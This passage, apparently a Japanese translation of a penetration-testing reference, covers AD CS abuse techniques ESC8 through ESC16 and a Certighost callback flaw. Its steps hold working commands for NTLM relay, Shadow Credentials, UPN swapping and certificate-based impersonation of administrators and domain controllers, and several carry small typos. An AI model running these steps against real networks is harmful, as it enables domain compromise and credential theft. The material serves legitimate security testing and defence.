account-persistence.md
{{#endref}}

NTLM relay attacks のもう1つの制限は、**被害アカウントが攻撃者の管理するマシンに対して認証する必要がある**ことです。攻撃者は、その認証を待つか、次の方法で認証を**強制**できます。


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **悪用**

[**Certify**](https://github.com/GhostPack/Certify) の `cas` は、**有効な HTTP AD CS endpoints** を列挙します。<sup>[[4]](#references)</sup>

```
Certify.exe cas
```

<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers` プロパティは、エンタープライズ認証局（CA）が Certificate Enrollment Service（CES）のエンドポイントを保存するために使用します。これらのエンドポイントは、**Certutil.exe** を使用して解析し、一覧表示できます。

```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```

<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>

```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```

<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Certifyの悪用

```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```

#### [Certipy](https://github.com/ly4k/Certipy)による悪用

Certipyはデフォルトで、リレーされるアカウント名が`$`で終わるかどうかに応じて、`Machine`または`User`テンプレートを使用して証明書を要求します。`-template`パラメーターを使用すると、別のテンプレートを指定できます。

その後、[PetitPotam](https://github.com/ly4k/PetitPotam)のような手法を使って認証を強制できます。ドメインコントローラーを扱う場合は、`-template DomainController`を指定する必要があります。

```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### 説明

**`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) は **`msPKI-Enrollment-Flag`** の値で、ESC9 と呼ばれます。この値を設定すると、証明書から `szOID_NTDS_CA_SECURITY_EXT` SID 拡張が省略されます。以前の ESC9 の例は、KDC の互換動作（`StrongCertificateBindingEnforcement=1`）または別の弱い Schannel マッピング経路に依存しています。値 `1` は**過去の互換性設定**であり、現在のデフォルトではありません。Microsoft によると、KDC の上書き設定は 2025 年 9 月 9 日の Windows セキュリティ更新プログラムをもってサポートされなくなりました。古い手順を適用する前に、対象の実際の更新状況と認証エンドポイントを確認してください。<sup>[[7]](#references)</sup> [Microsoft のロールアウトガイダンス](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers)を参照してください。

このフラグの設定が重要になる条件は次のとおりです。

- 古い互換性のある KDC では、有効な証明書バインドポリシーでマッピングが許可されていること。あるいは、Schannel エンドポイントで `CertificateMappingMethods` のビット `0x4` を使った UPN マッピングが個別に有効になっていること。
- 証明書の `msPKI-Enrollment-Flag` 設定で、`CT_FLAG_NO_SECURITY_EXTENSION` フラグが指定されていること。
- 証明書でクライアント認証 EKU が指定されていること。
- 別のアカウントを侵害する対象となるアカウントに対して `GenericWrite` 権限を持っていること。

### 悪用シナリオ

`John@corp.local` が `Jane@corp.local` に対する `GenericWrite` 権限を持ち、`Administrator@corp.local` の侵害を目指しているとします。`Jane@corp.local` が登録を許可されている `ESC9` 証明書テンプレートでは、`msPKI-Enrollment-Flag` 設定に `CT_FLAG_NO_SECURITY_EXTENSION` フラグが設定されています。

まず、`John` の `GenericWrite` 権限を利用して Shadow Credentials を使い、`Jane` のハッシュを取得します。

```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```

その後、`Jane` の `userPrincipalName` が `Administrator` に変更されます。意図的に `@corp.local` のドメイン部分を省略しています。

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

この変更は、`Administrator@corp.local` が `Administrator` の `userPrincipalName` として引き続き別個であるため、制約に違反しません。

続いて、脆弱と判定された `ESC9` 証明書テンプレートを `Jane` として要求します:

```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```

証明書の`userPrincipalName`には`Administrator`が反映されており、「object SID」は含まれていないことが確認できます。

その後、`Jane`の`userPrincipalName`は元の`Jane@corp.local`に戻されます。

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

発行された証明書で認証を試みると、`Administrator@corp.local` の NT hash が得られます。証明書にドメインの指定がないため、コマンドには `-domain <domain>` を含める必要があります。

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

## 弱い証明書マッピング - ESC10

### 説明

ESC10では、2つの異なる証明書マッピングポリシーがよく取り上げられます。関連する認証を実際に処理するエンドポイントの設定を確認してください。

- Schannel の `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` にある `CertificateMappingMethods` は、アプリケーションサーバー上の TLS クライアント証明書マッピングを制御します。UPN ビットは `0x4` です。更新済みシステムでのデフォルトは `0x18`（`0x8 | 0x10`）です。
- KDC の `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` にある `StrongCertificateBindingEnforcement` は、従来、Kerberos 証明書バインディングの互換性を制御していました。値 `1` は現在のデフォルトとして信頼できず、Microsoft は2025年9月9日の Windows セキュリティ更新プログラムをもって、このオーバーライドのサポートを終了しました。この設定状態だけでは、Schannel の UPN マッピングについて判断できません。<sup>[[7]](#references)</sup>

**ケース 1**

従来、古い KDC が `StrongCertificateBindingEnforcement=0` を有効として扱う場合がありました。現在のパッチ適用済みシステムではこのオーバーライドはサポートされなくなっているため、更新レベルを確認してください。

**ケース 2**

Schannel のクライアント証明書エンドポイントで、`CertificateMappingMethods` の UPN ビット（`0x4`）が有効になっている場合です。これは KDC の強固なバインディングの適用とは別の設定であり、登録可能なクライアント認証証明書と、マッピング先アカウントの属性を実効的に制御できることも引き続き必要です。

### Abuse Case 1

KDC がまだ `StrongCertificateBindingEnforcement=0` を有効として扱う古い環境では、アカウントの `userPrincipalName` を制御することが、別のアカウントへの弱いマッピング経路の一部になる場合があります。必要な証明書登録、マッピング、ターゲット ID、および認証の成功はそれぞれ個別に確認する必要があります。`GenericWrite` ACE やレジストリ値だけでは、乗っ取りが成立するとは言えません。

たとえば、`Jane@corp.local` に対する `GenericWrite` 権限を持つ攻撃者が、`Administrator@corp.local` の侵害を狙うケースです。この手順は ESC9 と同様で、任意の証明書テンプレートを利用できます。

まず、`GenericWrite` を悪用して Shadow Credentials で `Jane` のハッシュを取得します。

```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```

その後、制約違反を避けるため、`@corp.local` 部分を意図的に省略して、`Jane` の `userPrincipalName` が `Administrator` に変更されます。

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

続いて、既定の `User` テンプレートを使用し、`Jane` としてクライアント認証用の証明書を要求します。

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

`Jane` の `userPrincipalName` はその後、元の `Jane@corp.local` に戻されます。

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

取得した証明書で認証すると、`Administrator@corp.local` の NT hash が得られます。証明書にドメイン情報が含まれていないため、コマンドでドメインを指定する必要があります。

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

### Abuse Case 2

`CertificateMappingMethods` に `UPN` ビットフラグ（`0x4`）が含まれている場合、`GenericWrite` 権限を持つアカウント A は、`userPrincipalName` プロパティを持たない任意のアカウント B（マシンアカウントや組み込みドメイン管理者の `Administrator` を含む）を侵害できます。

ここでは、`GenericWrite` を利用して、まず Shadow Credentials により `Jane` の hash を取得し、`DC$@corp.local` を侵害することを目指します。

```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```

`Jane` の `userPrincipalName` は、その後 `DC$@corp.local` に設定されます。

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```

クライアント認証用の証明書が、デフォルトの `User` テンプレートを使用して `Jane` として要求されます。

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

このプロセスの後、`Jane`の`userPrincipalName`は元の値に戻ります。

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```

Schannel 経由で認証するには、Certipy の `-ldap-shell` オプションを使用します。認証が成功すると、`u:CORP\DC$` と表示されます。

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

LDAP shell では、`set_rbcd` などのコマンドを使って Resource-Based Constrained Delegation（RBCD）攻撃を実行でき、ドメインコントローラーを侵害する可能性があります。

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

この脆弱性は、`userPrincipalName` が設定されていないユーザーアカウントや、`userPrincipalName` が `sAMAccountName` と一致しないユーザーアカウントにも影響します。デフォルトの `Administrator@corp.local` は、LDAP 権限が高く、デフォルトでは `userPrincipalName` が設定されていないため、特に有力な標的です。

## Relaying NTLM to ICPR - ESC11

### 説明

CA Server で `IF_ENFORCEENCRYPTICERTREQUEST` が設定されていない場合、RPC service 経由で署名なしの NTLM relay attack が可能になります。[参考資料](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)。<sup>[[10]](#references)</sup>

`certipy` を使って `Enforce Encryption for Requests` が無効になっているか確認できます。無効の場合、certipy は `ESC11` の脆弱性を表示します。

```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
  0
    CA Name                             : DC01-CA
    DNS Name                            : DC01.domain.local
    Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
    ....
    Enforce Encryption for Requests     : Disabled
    ....
    [!] Vulnerabilities
      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```

### Abuse Scenario

リレーサーバーをセットアップする必要があります:

```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

注: domain controller の場合、DomainController で `-template` を指定する必要があります。

または [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) を使用します:

```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```

## ADCS CA への Shell access（YubiHSM） - ESC12

### 説明

管理者は、Certificate Authority を「Yubico YubiHSM2」のような外部デバイスに保存するよう設定できます。

CA サーバーの USB ポートに USB デバイスが接続されている場合、または CA サーバーが仮想マシンで USB デバイスサーバーを使用している場合、YubiHSM で鍵を生成・利用するには、Key Storage Provider 用の認証キー（「パスワード」と呼ばれることもあります）が必要です。

このキー／パスワードは、レジストリの `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` に平文で保存されています。

[こちら](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)を参照してください。<sup>[[11]](#references)</sup>

### 悪用シナリオ

Shell access を取得した際に、CA の秘密鍵が物理 USB デバイスに保存されていれば、鍵を復元できます。

まず CA 証明書（これは公開情報）を取得し、次の手順に進みます。

```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```

最後に、certutil の `-sign` コマンドを使用して、CA 証明書とその秘密鍵を使い、任意の新しい証明書を偽造します。

## OID Group Link Abuse - ESC13

### 説明

`msPKI-Certificate-Policy` 属性を使用すると、発行ポリシーを証明書テンプレートに追加できます。発行ポリシーを担う `msPKI-Enterprise-Oid` オブジェクトは、PKI OID コンテナー内の Configuration Naming Context（CN=OID,CN=Public Key Services,CN=Services）で確認できます。ポリシーは、このオブジェクトの `msDS-OIDToGroupLink` 属性を使用して AD グループにリンクできます。これにより、証明書を提示したユーザーを、そのグループのメンバーであるかのようにシステムが認可できるようになります。[こちらの参考資料](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53)。<sup>[[12]](#references)</sup>

つまり、ユーザーが証明書の登録権限を持ち、その証明書が OID グループにリンクされている場合、ユーザーはそのグループの特権を継承できます。

[Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) を使用して OIDToGroupLink を確認します。

```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```

### Abuse Scenario

ユーザーが持つ権限は、`certipy find` または `Certify.exe find /showAllPermissions` を使って確認できます。

`John` に `VulnerableTemplate` への enrollment 権限がある場合、そのユーザーは `VulnerableGroup` グループの特権を継承できます。

必要なのはテンプレートを指定することだけです。`OIDToGroupLink` 権限を持つ証明書を取得できます。

```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```

## 明示的な証明書マッピングの悪用 — ESC14

### 説明

https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping の説明は非常に詳しいものです。以下は原文からの引用です。<sup>[[14]](#references)</sup>

ESC14は、主にActive Directoryユーザーまたはコンピューターアカウントの`altSecurityIdentities`属性の誤用や安全でない設定によって発生する「弱い明示的な証明書マッピング」の脆弱性を扱います。この複数値属性を使うと、管理者は認証目的でX.509証明書をADアカウントに手動で関連付けられます。この属性に値が設定されると、明示的なマッピングが既定の証明書マッピングロジックを上書きする場合があります。既定のロジックでは通常、証明書のSAN内のUPNやDNS名、または`szOID_NTDS_CA_SECURITY_EXT`セキュリティ拡張に埋め込まれたSIDが使われます。

`altSecurityIdentities`属性内で証明書を識別するために使用される文字列が広範すぎる、容易に推測できる、一意ではない証明書フィールドに依存している、または簡単に偽装できる証明書要素を使っている場合、そのマッピングは「弱い」とみなされます。攻撃者が、特権アカウントに対して定義された弱い明示的マッピングに属性が一致する証明書を入手または作成できれば、その証明書を使って該当アカウントとして認証し、なりすますことができます。

弱い可能性のある`altSecurityIdentities`マッピング文字列の例を以下に示します。

- 一般的なSubject Common Name（CN）のみでマッピングする。例：`X509:<S>CN=SomeUser`。攻撃者は、より安全性の低い入手元からこのCNを持つ証明書を取得できる可能性があります。
- 特定のシリアル番号やSubject Key Identifierなどによる追加の限定なしに、汎用的すぎるIssuer Distinguished Name（DN）やSubject DNを使う。例：`X509:<I>CN=SomeInternalCA<S>CN=GenericUser`。
- その他、攻撃者が正当に入手または偽造できる証明書（CAを侵害した場合や、ESC1のような脆弱なテンプレートを見つけた場合）で満たせる、予測可能なパターンや暗号学的でない識別子を使う。

`altSecurityIdentities`属性は、次のようなさまざまなマッピング形式に対応しています。

- `X509:<I>IssuerDN<S>SubjectDN`（Issuer DNとSubject DNの全体でマッピング）
- `X509:<SKI>SubjectKeyIdentifier`（証明書のSubject Key Identifier拡張値でマッピング）
- `X509:<SR>SerialNumberBackedByIssuerDN`（Issuer DNで暗黙的に限定したシリアル番号でマッピング）— これは標準形式ではなく、通常は`<I>IssuerDN<SR>SerialNumber`です。
- `X509:<RFC822>EmailAddress`（SAN内のRFC822名、通常はメールアドレスでマッピング）
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey`（証明書のRaw Public KeyのSHA1ハッシュでマッピング。一般に強固）

これらのマッピングの安全性は、マッピング内で使われる識別子によって異なります。Microsoftは、`X509:<RFC822>`を含む、メールアドレスまたはSubject名に基づくマッピングを**弱い**と分類しています。Full Enforcementモードでは、強固なマッピングのない証明書は拒否されます。2025年9月のWindowsセキュリティ更新プログラムにより、Compatibilityモードに戻すオプションは削除されました。そのため、弱いマッピングだけでは、現在、信頼できるなりすまし経路にはなりません。弱いマッピングのシナリオを評価する前に、ドメインコントローラーの実際のパッチレベルと証明書マッピングの動作を確認してください。`altSecurityIdentities`への書き込み権限は別の調査ポイントです。適切な信頼済み証明書を持つ攻撃者は、有効な権限と証明書検証の条件に応じて、**強固な**明示的マッピングを追加できる可能性があります。[Microsoft KB5014754](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers)および[ESC14に関する調査](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)を参照してください。

証明書認証の失敗についても原因を調べる必要があります。対象アカウントが無効になっている場合やパスワードが期限切れの場合、証明書自体が有効でもログインできないことがあります。

### 悪用シナリオ

ESC14は、Active Directory（AD）の**明示的な証明書マッピング**、特に`altSecurityIdentities`属性を標的とします。この属性が（設計上または設定ミスにより）設定されている場合、攻撃者はマッピングに一致する証明書を提示してアカウントになりすますことができます。

#### シナリオA：攻撃者が`altSecurityIdentities`に書き込める

 **前提条件**：攻撃者が対象アカウントの`altSecurityIdentities`属性への書き込み権限を持つか、対象ADオブジェクトに対する以下のいずれかの権限を通じて、その権限を付与できること。  
- `altSecurityIdentities`のWrite property  
- `Public-Information`のWrite property  
- Write property (all)  
- `WriteDACL`  
- `WriteOwner`*  
- `GenericWrite`  
- `GenericAll`  
- Owner*。
#### シナリオB：対象にX509RFC822（メールアドレス）による弱いマッピングがある

- **歴史的／条件付きの前提条件**：対象の`altSecurityIdentities`に弱いX509RFC822マッピングがあり、攻撃者が登録者の`mail`属性を編集でき、適切なテンプレートにより、競合するSIDバインディングのないクライアント認証用証明書にそのメールアドレスが含まれること。認証には、弱いマッピングを依然として受け入れる環境も必要です。Full Enforcementでは、弱いマッピングのみの証明書は拒否されます。`mail`属性への書き込みが可能というだけでは、調査の手がかりにすぎません。
#### シナリオC：対象にX509IssuerSubjectマッピングがある

- **前提条件**：対象の`altSecurityIdentities`に弱いX509IssuerSubject明示的マッピングがあること。攻撃者は、被害者プリンシパルの`cn`または`dNSHostName`属性を設定し、対象のX509IssuerSubjectマッピング内のSubjectと一致させることができます。その後、攻撃者は被害者として証明書を登録し、その証明書を使って対象として認証できます。
#### シナリオD：対象にX509SubjectOnlyマッピングがある

- **前提条件**：対象の`altSecurityIdentities`に弱いX509SubjectOnly明示的マッピングがあること。攻撃者は、被害者プリンシパルの`cn`または`dNSHostName`属性を設定し、対象のX509SubjectOnlyマッピング内のSubjectと一致させることができます。その後、攻撃者は被害者として証明書を登録し、その証明書を使って対象として認証できます。
### 具体的な操作
#### シナリオA

証明書テンプレート`Machine`の証明書を要求する。

```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```

 証明書を保存して変換する

```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```

 認証（証明書を使用）

```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```

クリーンアップ（任意）

```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```

さまざまな攻撃シナリオにおける、より具体的な攻撃手法については、以下を参照してください: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0)。<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### 説明

[ESC15の元となった調査](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)では、V1 templateへのリクエストで指定されたapplication policiesが、**パッチ未適用の発行CA**で設定済みのExtended Key Usageを上書きできる仕組みを解説しています。<sup>[[15]](#references)</sup> また、候補となるtemplateは公開済みで登録可能であり、必要なsubject/request propertiesを許可し、承認や署名の必須条件によってブロックされない必要があります。登録権限があるだけでは、悪用可能であることの証明にはなりません。Certificate Request Agentの利用には、適切な2つ目のtemplateや登録エージェントの制限が関係する場合もあります。この攻撃経路を主張する前に、CAのパッチ適用状況と証明書の発行結果を確認してください。

### 悪用

[Certipyの権限昇格に関するドキュメント](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu)に、より詳しい使用例があります。<sup>[[14]](#references)</sup>


Certipyの`find`コマンドを使うと、CAにパッチが適用されていない場合に、ESC15の影響を受ける可能性があるV1 templateを特定できます。

```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```

#### シナリオ A: Schannel 経由の直接なりすまし

**ステップ 1: 「Client Authentication」Application Policy と対象の UPN を注入して証明書を要求する。** 攻撃者 `attacker@corp.local` は、登録者がサブジェクトを指定できる V1 テンプレート「WebServer」を使用して、`administrator@corp.local` を標的にする。

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
    -application-policies 'Client Authentication'
```

- `-template 'WebServer'`: "Enrollee supplies subject" が設定された脆弱な V1 template。
- `-application-policies 'Client Authentication'`: CSR の Application Policies extension に OID `1.3.6.1.5.5.7.3.2` を挿入します。
- `-upn 'administrator@corp.local'`: なりすまし用に SAN の UPN を設定します。

**Step 2: 取得した証明書を使って Schannel（LDAPS）経由で認証します。**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```

#### Scenario B: Enrollment Agent の悪用による PKINIT/Kerberos Impersonation

**Step 1: V1 template（「Enrollee supplies subject」）から証明書を要求し、「Certificate Request Agent」Application Policy を注入します。** この証明書は、攻撃者（`attacker@corp.local`）が Enrollment Agent になるためのものです。目的は Agent の権限を得ることなので、ここでは攻撃者自身の ID に UPN を指定しません。

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -application-policies 'Certificate Request Agent'
```

- `-application-policies 'Certificate Request Agent'`: OID `1.3.6.1.4.1.311.20.2.1`を注入します。

**ステップ 2:「agent」証明書を使用して、特権を持つターゲットユーザーに代わって証明書を要求します。** これはESC3に似た手順で、ステップ 1の証明書をagent証明書として使用します。

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'User' \
    -pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```

**Step 3: "on-behalf-of" 証明書を使用して、特権ユーザーとして認証する。**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```

## CA で Security Extension が無効（全体）-ESC16

### 説明

**ESC16（szOID_NTDS_CA_SECURITY_EXT Extension の欠如による権限昇格）**は、CA 全体で **szOID_NTDS_CA_SECURITY_EXT** SID extension を抑制する設定を指します。これは設定上の指標であり、証明書を使って別のアカウントとして認証できることの証明ではありません。なりすましには、該当アカウントの属性またはマッピングを制御できること、クライアント認証に使用でき、登録可能なテンプレートがあること、さらに実際のドメインコントローラーまたはサービスが受け入れる証明書マッピング経路があることも必要です。Full Enforcement のパッチ適用済み KDC は、別の強力なマッピングがない限り SID extension のない証明書を拒否します。以下の UPN のみを使う Kerberos 手順は、弱いマッピングを引き続き受け入れる古い KDC または互換モードの KDC に適用されます。[Microsoft の証明書マッピングと適用に関するガイダンス](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers)を参照してください。

詳細な原則については、こちらの記事も参照してください：https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### 悪用

以下の、UPN のみを使う Kerberos の歴史的な例は、[Certipy の ESC16 ドキュメント](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally)に基づいています。この例には、生成される弱いマッピングを引き続き受け入れる KDC が必要です。`StrongCertificateBindingEnforcement=1` は、2025 年 9 月 9 日の Windows セキュリティ更新プログラム以降、サポートされている上書き設定ではありません。<sup>[[14]](#references)</sup>

Active Directory Certificate Services (AD CS) 環境が **ESC16** に対して脆弱かどうかを特定するには、以下を実行します。

```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```

**ステップ 1: 被害者アカウントの初期 UPN を読み取る（任意 - 復元用）。  


```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -user 'victim' \
    read
```

**ステップ 2: 被害者アカウントの UPN を、ターゲット管理者の `sAMAccountName` に更新します。  

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'administrator' \
    -user 'victim' update
```

**Step 3: (必要な場合) 「victim」アカウントの認証情報を取得する（例: Shadow Credentials を使用）。**

```shell
certipy shadow \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -account 'victim' \
    auto
```

**Step 4: ESC16-configured CAで、アカウントがenrollできるクライアント認証テンプレート（例:「User」）から「victim」ユーザーとして証明書を要求します。** CAは発行した証明書からSID security extensionを省略しますが、これだけでは利用可能な認証マッピングが確立されたことにはなりません。Kerberos credential cacheの環境変数を設定します（shell command）：

```bash
export KRB5CCNAME=victim.ccache
```

次に証明書を要求します:

```bash
certipy req \
    -k -dc-ip '10.0.0.100' \
    -target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
    -template 'User'
```

**手順 5: 「victim」アカウントのUPNを元に戻します。**

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'victim@corp.local' \
    -user 'victim' update
```

**Step 6: この弱いマッピングを受け入れる古い KDC または互換モードの KDC で、対象の administrator として認証します。**

```bash
certipy auth \
    -dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
    -username 'administrator' -domain 'corp.local'
```

## Rogue LDAP/LSA chase callback ID置換 (Certighost / CVE-2026-54121)

### 説明

**Certighost** は、CAが発行する証明書に記載するIDを解決する際、要求者が指定した属性を信頼する **AD CS enrollment chase / callback path** を悪用します。公開PoCでは、細工したリクエストに次の属性を含めます:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: CAが接続する、攻撃者が制御するホスト/IP
- **`rmd`**: なりすます対象の **Domain Controller DNS name**

CAがこのchaseに従うと、**SMB/LSA (`445`)** と **LDAP (`389`)** 経由で攻撃者に接続します。攻撃者は **実在するmachine account**（通常はデフォルトの **`ms-DS-MachineAccountQuota`** を利用して作成）を使用するため、callbackセッションは有効なdomain principalとして認証されます。一方、偽装サービスは代わりに **対象DC** のID属性を返します:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

CAが **返されたIDと認証済みcallback principalを暗号学的に結び付けて検証しない** 場合、セッションが攻撃者の制御するmachine accountとして認証されていても、**Domain Controller** 用の証明書を発行する可能性があります。この点で、この脆弱性は概念的に **Certifried** とは異なります。攻撃者は `dNSHostName` などのAD属性を書き換えるのではなく、**CA callbackによるID解決時にIDデータを置き換えます**。<sup>[[2]](#references)</sup>

**有用な前提条件:**

- 低権限の **domain credentials**
- computer accountを **作成または再利用する** 能力
